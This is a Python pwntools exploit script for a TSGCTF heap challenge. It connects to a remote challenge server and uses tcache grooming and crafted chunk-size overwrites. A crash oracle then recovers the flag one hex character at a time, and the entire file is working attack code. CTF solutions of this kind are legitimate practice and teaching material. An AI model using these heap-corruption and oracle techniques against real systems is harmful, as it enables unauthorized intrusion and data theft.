from pwn import *

host = "35.221.81.216"
port = 30001


# r = remote(host, port)

def just_u64(x):
    return u64(x.ljust(8, '\x00'))


def solve(idx, c):
    r = remote(host, port)

    def recvuntil(x, verbose=True):
        # sleep(1)
        s = r.recvuntil(x)
        if log and verbose:
            print(s)
        return s.strip(x)

    def recv(verbose=True):
        s = r.recv()
        if log and verbose:
            print(s)
        return s

    def recvline(verbose=True):
        s = r.recvline()
        if log and verbose:
            print(s)
        return s.strip('\n')

    def sendline(s, verbose=True):
        if log and verbose:
            pass
            # print(s)
        r.sendline(s)

    def send(s, verbose=True):
        if log and verbose:
            print(s, end='')
        r.send(s)

    def interactive():
        r.interactive()

    ####################################

    def menu(choice):
        recvuntil(b'>')
        sendline(str(choice))

    # receive and send
    def rs(r, s, new_line=True):
        recvuntil(r)
        if new_line:
            sendline(s)
        else:
            send(s)

    def alloc(index, size, data):
        menu(0)
        recvuntil(b'index >')
        sendline(str(index))
        recvuntil(b'size >')
        sendline(str(size))
        recvuntil(b'data >')
        sendline(data)

    def dealloc(index):
        menu(1)
        recvuntil(b'index >')
        sendline(str(index))

    def read(index, idx):
        menu(2)
        recvuntil(b'index >')
        sendline(str(index))
        recvuntil(b'at >')
        sendline(str(idx))

    recvuntil(b'index >')
    sendline(str(idx))

    size = 0x20

    # pad
    alloc(0, 0x30, '')
    dealloc(0)

    for i in range(7):
        alloc(0, 10, '')
        dealloc(0)

    alloc(0, 10, '')
    dealloc(0)  # for overwrite d3b0

    for i in range(7):
        alloc(0, size, '')
        dealloc(0)

    nums = '0123456789'
    alphas = 'abcdef'
    if c in nums:
        alloc(0, size, b'\x00' * 8 + b'\x00' * nums.find(c) + b'\x31')  # d520
        alloc(1, size, '')
    elif c in alphas:
        alloc(0, size, '')
        alloc(1, size, b'\x00' * (16 + 9) + b'\x00' * alphas.find(c) + b'\x31')  # d550
    else:
        print('invalid')
        import sys
        sys.exit(-1)
    dealloc(0)
    dealloc(1)

    alloc(0, 10, '')
    read(0, 0x1a0)

    if c in alphas:
        alloc(1, size, b'\x00' * 9 + b'\x00' * alphas.find(c) + b'\x31')  # d550
    else:
        alloc(0, size, '')
    try:
        alloc(0, size, '')
    except:
        r.close()
        return False
    r.close()
    return True


# print(solve(9, 'f'))

s = 'TSGCTF{'
for i in range(7, 39):
    print(i, end=' ')
    for c in '0123456789abcdef':
        if solve(i, c):
            s += c
            break
    else:
        log.error('Fail')
        import sys

        sys.exit(-1)

s += '}'

log.info('solved!')
log.info("Flag --> %s" % s)
